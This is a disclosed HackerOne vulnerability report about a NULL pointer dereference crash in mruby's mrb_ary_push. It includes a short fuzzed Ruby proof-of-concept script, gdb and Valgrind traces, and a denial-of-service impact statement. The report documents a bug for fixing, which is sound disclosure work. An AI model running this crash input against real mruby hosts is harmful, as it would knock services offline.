# Crash in mrb_ary_push

## Report Details
- **Report ID**: 420115
- **URL**: https://hackerone.com/reports/420115
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2018-10-06T18:30:45.630Z
- **Disclosed**: 2019-09-04T13:33:48.294Z

## Reporter
- **Username**: dgaletic
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
PoC
===
The following demonstrates a crash:

    def method_missing(*)
    end
    {}.[]0[*0] %=
    begin{0=>0}
    00end


Debug info
==========

The crash happens in `mrb_ary_push`:

    495│ mrb_ary_push(mrb_state *mrb, mrb_value ary, mrb_value elem)
    496│ {
    497│   struct RArray *a = mrb_ary_ptr(ary);
    498├─> mrb_int len = ARY_LEN(a);

    (gdb) p a
    $1 = (struct RArray *) 0x0


Valgrind report:

    ==17609== Memcheck, a memory error detector
    ==17609== Copyright (C) 2002-2017, and GNU GPL'd, by Julian Seward et al.
    ==17609== Using Valgrind-3.14.0.GIT and LibVEX; rerun with -h for copyright info
    ==17609== Command: mruby poc
    ==17609==
    ==17609== Invalid read of size 4
    ==17609==    at 0x136134: mrb_ary_push (array.c:498)
    ==17609==    by 0x16EEAE: mrb_vm_exec (vm.c:2614)
    ==17609==    by 0x1647E6: mrb_vm_run (vm.c:972)
    ==17609==    by 0x1787F7: mrb_top_run (vm.c:2999)
    ==17609==    by 0x1523E4: mrb_load_exec (parse.y:6013)
    ==17609==    by 0x1525C6: mrb_load_file_cxt (parse.y:6022)
    ==17609==    by 0x10DBF1: main (mruby.c:280)
    ==17609==  Address 0x0 is not stack'd, malloc'd or (recently) free'd

Test platform
=============
* Arch Linux

mruby SHA: a690aef8d3219e3123822e741e2bb7c97220425c

Thank you,
Dinko Galetic
Denis Kasak

## Impact

DOS through crashing the mruby process.

## Attachments
- poc
